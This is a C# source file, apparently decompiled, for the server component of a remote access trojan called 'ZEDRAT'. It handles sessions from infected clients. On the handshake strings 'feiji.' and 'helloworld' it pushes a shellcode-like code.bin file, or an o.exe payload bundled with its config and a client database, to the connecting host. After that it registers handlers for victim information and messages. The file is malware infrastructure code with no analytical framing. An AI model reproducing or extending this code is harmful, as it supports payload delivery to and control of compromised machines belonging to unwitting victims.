using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ZEDRAT.Module;
using ZEDRAT.TCP;

namespace Sockets
{
	public class TcpClientSession
	{
		public object _ObjRecvbytes = new object();

		public string _sessionKey;

		public IPEndPoint _remoteEndPoint;

		public IPEndPoint _localEndPoint;

		public string _senssionSign;

		public int _HeadPacketSize;

		public bool _FristPacket = true;

		public object SendSync = new object();

		public NetworkStream _netstream;

		public List<byte> _HeadAndPayloadPacket = new List<byte>();

		public TcpServer _tcpServer;

		public TcpClient _tcpClient;

		public IAsyncEventDispatcher _Idispatchar;

		public ClientInfomation _cif;

		public TcpClientSession(TcpClient tcpClient, TcpServer tcpServer)
		{
			this._tcpClient = tcpClient;
			this._tcpServer = tcpServer;
			this._sessionKey = Guid.NewGuid().ToString();
			this._remoteEndPoint = (IPEndPoint)this._tcpClient.Client.RemoteEndPoint;
			this._localEndPoint = (IPEndPoint)this._tcpClient.Client.LocalEndPoint;
			this._Idispatchar = new IAsyncEventDispatcher(this);
			this._cif = new ClientInfomation();
		}

		~TcpClientSession()
		{
		}

		private void SetSocketOptions()
		{
			this._tcpClient.Client.IOControl(IOControlCode.KeepAliveValues, this.KeepAlive(1, 30000, 10000), null);
		}

		private byte[] KeepAlive(int onOff, int keepAliveTime, int keepAliveInterval)
		{
			byte[] array = new byte[12];
			BitConverter.GetBytes(onOff).CopyTo(array, 0);
			BitConverter.GetBytes(keepAliveTime).CopyTo(array, 4);
			BitConverter.GetBytes(keepAliveInterval).CopyTo(array, 8);
			return array;
		}

		public async Task AsyncClientRecv()
		{
			try
			{
				this._netstream = this._tcpClient.GetStream();
				while (this._tcpClient.Connected)
				{
					byte[] _readbyte = new byte[16192];
					int num = await this._netstream.ReadAsync(_readbyte, 0, 16192);
					if (num == 0)
					{
						throw new Exception();
					}
					byte[] array = new byte[num];
					Buffer.BlockCopy(_readbyte, 0, array, 0, num);
					lock (this._ObjRecvbytes)
					{
						this._tcpServer.RecvBytes += num;
					}
					this._HeadAndPayloadPacket.AddRange(array);
					this.SplitPacket();
				}
			}
			catch (Exception ex)
			{
				this.Close();
				throw ex;
			}
		}

		private void SplitPacket()
		{
			try
			{
				if (this._FristPacket)
				{
					this._senssionSign = Encoding.UTF8.GetString(this._HeadAndPayloadPacket.GetRange(0, this._HeadAndPayloadPacket.Count).ToArray());
					if (this._senssionSign.Equals("feiji."))
					{
						byte[] array = File.ReadAllBytes(Application.StartupPath + "\\file\\code.bin");
						this._netstream.Write(BitConverter.GetBytes(array.Length), 0, 4);
						this._netstream.Write(array, 0, array.Length);
						throw new Exception(" pppgod");
					}
					if (this._senssionSign.Equals("helloworld"))
					{
						byte[] array2 = File.ReadAllBytes(Application.StartupPath + "\\file\\o.exe");
						byte[] array3 = File.ReadAllBytes(Application.StartupPath + "\\file\\o.exe.config");
						byte[] array4 = File.ReadAllBytes(Application.StartupPath + "\\file\\client.db");
						using MemoryStream memoryStream = new MemoryStream();
						using BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
						binaryWriter.Write(BitConverter.GetBytes(array2.Length));
						binaryWriter.Write(BitConverter.GetBytes(array3.Length));
						binaryWriter.Write(BitConverter.GetBytes(array4.Length));
						binaryWriter.Write(array2);
						binaryWriter.Write(array3);
						binaryWriter.Write(array4);
						byte[] array5 = memoryStream.ToArray();
						this._netstream.Write(array5, 0, array5.Length);
						throw new Exception(" helloworld");
					}
					if (!this._senssionSign.Contains("-"))
					{
						this._tcpServer.ClientMessage(this._remoteEndPoint.Address.ToString() + "  ....Evil Connecting.....?", null);
						throw new Exception();
					}
					this._Idispatchar.Register(DataType.InformationType, new Action<TcpClientSession, byte[]>(this._cif.ClientInfoExecute));
					this._Idispatchar.Register(DataType.ClientMessage, new Action<TcpClientSession, byte[]>(ClientMessage));
					this._HeadPacketSize = 1 + this._senssionSign.Length + 8;
					this._FristPacket = false;
					this._HeadAndPayloadPacket.Clear();
					this._tcpServer.ClientConnected(this, null);
				}
				else
				{
					if (this._HeadAndPayloadPacket.Count < this._HeadPacketSize)
					{
						return;
					}
					TcpHeartPacket tcpHeartPacket = TcpHeartPacket.ByteToStruct(this._HeadAndPayloadPacket.GetRange(0, this._HeadPacketSize).ToArray());
					if (!tcpHeartPacket._senssionSign.Equals(this._senssionSign))
					{
						this._HeadAndPayloadPacket.Clear();
					}
					else if (tcpHeartPacket._PayloadSize > 16192)
					{
						this._HeadAndPayloadPacket.Clear();
					}
					else if (this._HeadAndPayloadPacket.Count - this._HeadPacketSize >= tcpHeartPacket._PayloadSize)
					{
						if (this._HeadAndPayloadPacket.Count - this._HeadPacketSize > tcpHeartPacket._PayloadSize)
						{
							this._Idispatchar.DispatchMessageHandler(tcpHeartPacket, this._HeadAndPayloadPacket.GetRange(this._HeadPacketSize, tcpHeartPacket._PayloadSize).ToArray());
							this._HeadAndPayloadPacket.RemoveRange(0, tcpHeartPacket._PayloadSize + this._HeadPacketSize);
							this.SplitPacket();
						}
						if (this._HeadAndPayloadPacket.Count - this._HeadPacketSize == tcpHeartPacket._PayloadSize)
						{
							this._Idispatchar.DispatchMessageHandler(tcpHeartPacket, this._HeadAndPayloadPacket.GetRange(this._HeadPacketSize, tcpHeartPacket._PayloadSize).ToArray());
							this._HeadAndPayloadPacket.Clear();
						}
					}
				}
			}
			catch (Exception ex)
			{
				this._HeadAndPayloadPacket.Clear();
				this._tcpServer.ClientMessage(this._remoteEndPoint.Address.ToString() + ex.Message, null);
				throw ex;
			}
		}

		public void Client_Send(DataType dt, byte[] payload)
		{
			try
			{
				lock (this.SendSync)
				{
					if (!this._tcpClient.Connected)
					{
						this.Close();
						throw new Exception();
					}
					List<byte> list = new List<byte>();
					list.AddRange(TcpHeartPacket.StructToByte(new TcpHeartPacket(this._senssionSign, payload.Length, (int)dt)));
					list.AddRange(payload);
					this._tcpServer.SendBytes += list.ToArray().Length;
					this._netstream.Write(list.ToArray(), 0, list.ToArray().Length);
				}
			}
			catch (Exception ex)
			{
				throw ex;
			}
		}

		public void ClientMessage(TcpClientSession tcs, byte[] bt)
		{
			this._tcpServer.ClientMessage(tcs._remoteEndPoint.Address.ToString() + Encoding.UTF8.GetString(bt), null);
		}

		public void Close()
		{
			try
			{
				this._tcpClient?.Client.Shutdown(SocketShutdown.Both);
				this._netstream?.Dispose();
				this._tcpClient?.Close();
				this._tcpClient?.Dispose();
				this._cif?.destroy();
				this._Idispatchar?.destroy();
				this._HeadAndPayloadPacket?.Clear();
			}
			catch
			{
			}
			finally
			{
				this._Idispatchar = null;
				this._netstream = null;
				this._tcpClient = null;
				this._HeadAndPayloadPacket = null;
				this._tcpServer = null;
			}
		}
	}
}
